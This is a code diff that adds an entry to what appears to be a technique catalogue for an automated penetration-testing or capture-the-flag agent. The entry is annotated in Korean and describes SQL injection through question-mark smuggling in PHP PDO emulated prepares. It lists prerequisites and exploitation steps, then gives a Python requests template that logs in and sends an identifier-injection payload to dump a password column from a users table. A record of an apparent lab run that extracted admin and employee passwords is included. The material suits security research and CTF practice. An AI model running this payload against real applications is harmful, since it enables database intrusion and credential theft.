@@ -93,6 +93,67 @@ TECHNIQUES: list[dict] = [
         },
     },
     {
+        "name": "pdo_emulate_prepare_question_mark_smuggling",
+        "vuln_type": "sqli",
+        "category": "exploitation",
+        "safety_level": "safe",
+        "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
+        "attack_metadata": {
+            "kind": "exploit_technique",
+            "name": "PDO emulate-prepare `?` smuggling — column/identifier injection",
+            "applies_when": (
+                "PHP PDO MySQL backend가 emulate prepare 모드(default `PDO::ATTR_EMULATE_PREPARES=true`)"
+                "이고, prepared statement의 SQL string 일부에 사용자 입력이 동적 concat되어 추가 `?` "
+                "토큰을 만들 수 있는 경우. 정상적으로 column/identifier/table name 위치에 입력이 "
+                "들어가지만, 그 안에 `?` 한 개를 박으면 client-side prepare가 다른 placeholder로 인식 "
+                "→ WHERE 절의 `?` 가 unbound로 밀려나고 우리 입력이 그 자리로 들어감."
+            ),
+            "prerequisites": [
+                "PDO + MySQL (다른 backend에서는 server-side prepare로 무효)",
+                "ATTR_EMULATE_PREPARES=true (PDO MySQL 기본값)",
+                "동적 concat된 부분이 backtick으로 감싸지지 않거나, 감싸졌어도 input이 backtick 포함",
+                "execute([single_value]) 같이 placeholder 1개만 바인드하는 호출 패턴",
+            ],
+            "technique_steps_md": (
+                "1. 식별: `prepare(\"SELECT $col_param FROM t WHERE x = ?\"); execute([input])` 패턴\n"
+                "2. col_param 에 `\\?#\\x00` 같은 가짜 column name + `?` + comment + null byte 박음\n"
+                "   → SQL: `SELECT \\?#\\0 FROM t WHERE x = ?` (총 ? 2개)\n"
+                "3. PDO emulate prepare가 첫 `?` 를 input 으로 string 치환:\n"
+                "   `SELECT \\<input_value>#\\0 FROM t WHERE x = ?`\n"
+                "4. input 안에 backtick 으로 column 닫고 임의 SELECT subquery 삽입 + `;#` 으로 뒤 SQL 주석 처리\n"
+                "5. response: 결과를 column-display 안 거치고 `array_values($row)` (CSV/JSON dump) 로 받기"
+            ),
+            "code_template": (
+                "import requests\n"
+                "s = requests.Session()\n"
+                "s.post(f'{TARGET}/login.php', data={{'username': USER, 'password': PW}})\n"
+                "r = s.get(f'{TARGET}/index.php', params={{\n"
+                "    'col': '\\\\?#\\x00',\n"
+                "    'name': \"x` FROM (SELECT {leak_column} AS `'x` FROM {leak_table})y;#\",\n"
+                "    'download': '1',  # array_values dump 가 가장 robust\n"
+                "}})\nprint(r.text)  # CSV: 한 줄당 한 row"
+            ),
+            "examples": [
+                {
+                    "problem_id": "2026-erp-system",
+                    "captured_flag": None,
+                    "params": {
+                        "leak_column": "password",
+                        "leak_table": "users",
+                        "extracted": "FAKE_PASSWORD (admin) + erp123 × 10 (사원)",
+                        "post_exploit": "admin login → Stage 2 (PHP filter chain SSRF) — 외부 server 필요, scope 밖",
+                    },
+                    "notes": (
+                        "ref: slcyber.io PDO 연구. CSV download 옵션이 column-name 매핑 우회에 유용 — "
+                        "displayColumns 가 colParam 로만 결정되므로 HTML table은 `-` 로 표시되지만 "
+                        "?download=1 의 array_values 는 실제 SELECT 결과를 그대로 dump."
+                    ),
+                },
+            ],
+            "tags": ["sqli", "pdo", "emulate-prepare", "identifier-injection"],
+        },
+    },
+    {
         "name": "safe_eval_attribute_chain",
         "vuln_type": "code_injection",
         "category": "exploitation",
